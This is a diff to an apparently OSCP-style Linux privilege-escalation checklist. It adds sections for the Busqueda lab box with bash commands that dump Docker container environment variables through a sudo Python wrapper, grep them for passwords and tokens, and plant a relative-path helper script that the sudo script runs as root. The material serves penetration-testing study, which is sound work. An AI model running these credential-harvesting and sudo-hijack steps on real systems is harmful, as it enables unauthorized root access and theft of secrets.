@@ -930,6 +930,7 @@ This page turns one repeatable part of an authorized assessment into a checklist
 - [[OSCP/BOXES/WRITE UPS/Linux/Cap|Cap]] -- versioned Python `cap_setuid` capability converted directly into UID 0
 - [[OSCP/BOXES/WRITE UPS/Linux/Cockpit|Cockpit]] -- `sudo tar *` checkpoint-action wildcard abuse
 - [[OSCP/BOXES/WRITE UPS/Linux/Management|Management]] -- duplicate rdiff-backup restriction argument used through a read-only protocol
+- [[OSCP/BOXES/WRITE UPS/Linux/Busqueda|Busqueda]] -- Docker environment inspection and relative helper execution through a sudo Python wrapper
 - [[OSCP/BOXES/WRITE UPS/Linux/Jarvis|Jarvis]] -- SUID `systemctl` editor path created a SUID Bash helper
 - [[OSCP/BOXES/WRITE UPS/Linux/Nukem|Nukem]] -- SUID DOSBox used to write a controlled sudoers rule
 - [[OSCP/BOXES/WRITE UPS/Linux/Payday|Payday]] -- unrestricted sudo was validated before using `sudo su`
@@ -999,3 +1000,38 @@ whoami
 Use the exact binary path from sudoers and record the identity proof privately. The direct reference is [GTFOBins Knife](https://gtfobins.org/gtfobins/knife/).
 
 **Seen in:** [[OSCP/BOXES/WRITE UPS/Linux/Knife|Knife]].
+
+## Docker environment inspection through a sudo wrapper
+
+When sudo permits a script with Docker actions, inspect the source and preserve environment output as private loot. A Go template prints only the selected field, while the container name identifies the object.
+
+```bash
+sudo -n -l
+sed -n '1,260p' "$SudoScript"
+boxset DockerFormat '{{json .Config.Env}}'
+sudo /usr/bin/python3 "$SudoScript" docker-ps
+sudo /usr/bin/python3 "$SudoScript" docker-inspect "$DockerFormat" "$ContainerName" \
+  > "$BoxDir/loot/$ContainerName-env.json"
+chmod 600 "$BoxDir/loot/$ContainerName-env.json"
+grep -Ein 'user|username|pass|password|secret|token|database|admin' \
+  "$BoxDir/loot/$ContainerName-env.json"
+```
+
+Do not assume a loopback-only container is irrelevant. Test it from the target shell and validate one candidate credential against the service named by the environment key.
+
+## Relative helper path in a sudo Python script
+
+If the permitted script invokes `./full-checkup.sh`, trace its current directory and argument handling before creating a proof-only helper.
+
+```bash
+grep -nE 'full-checkup|arg_list|subprocess|cwd|chdir' "$SudoScript"
+printf '%s\n' '#!/bin/bash' 'id > /tmp/root-proof.txt' > "$HOME/full-checkup.sh"
+chmod 700 "$HOME/full-checkup.sh"
+cd "$HOME"
+sudo /usr/bin/python3 "$SudoScript" full-checkup
+cat /tmp/root-proof.txt
+```
+
+The relative path is resolved by the process working directory unless the script changes it. The exact `cd` is therefore part of the exploit condition. Restore or remove only the helper created during the current run and keep the proof file private.
+
+**Seen in:** [[OSCP/BOXES/WRITE UPS/Linux/Busqueda|Busqueda]].
